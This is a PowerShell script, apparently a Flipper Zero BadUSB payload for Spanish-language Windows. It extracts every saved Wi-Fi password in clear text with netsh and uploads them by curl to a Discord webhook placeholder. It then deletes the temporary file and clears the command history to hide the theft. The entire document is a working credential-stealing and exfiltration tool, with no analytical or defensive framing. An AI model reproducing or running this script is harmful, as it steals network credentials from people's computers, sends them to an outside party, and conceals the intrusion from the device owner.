# Get the first 10 Wi-Fi profiles
$wifiProfiles = netsh wlan show profiles | Select-Object

# Define the webhook URL
$webhook_url = "URL-WEBHOOK"

# Create an array to store the Wi-Fi profile details
$wifiProfileDetailsArray = @()

$content = '```ml'
$content += "`n"

$wifiProfiles | ForEach-Object {
    $profileName = $_ | Select-String 'Perfil de todos los usuarios\s+:\s(.+)' | ForEach-Object {
        $_.Matches.Groups[1].Value
    }
    $wifiProfileDetails = netsh wlan show profile name="$profileName" key=clear

    $wifiPassword = $wifiProfileDetails | Select-String 'Contenido de la clave\s+:\s(.+)' | ForEach-Object {
        $_.Matches.Groups[1].Value
    }

    if ($wifiPassword) {
        $content += "Wi-Fi password $profileName : $wifiPassword`n"  # Use `n for a newline
        $wifiProfileDetailsArray += "Wi-Fi password $profileName : $wifiPassword"
    }

}

$content += '```'

$message_data = @{
    'username' = $env:username + "Flipper"
    'content'  = $content
}

# Save passwords to a text file
$wifiProfileDetailsArray | Out-File -FilePath "$env:TEMP\WiFiPasswords.txt"

# Upload the text file to Discord
curl.exe -F "file1=@$env:TEMP\WiFiPasswords.txt" $webhook_url

# Clear command history
RI $env:TEMP\WiFiPasswords.txt
Clear-History
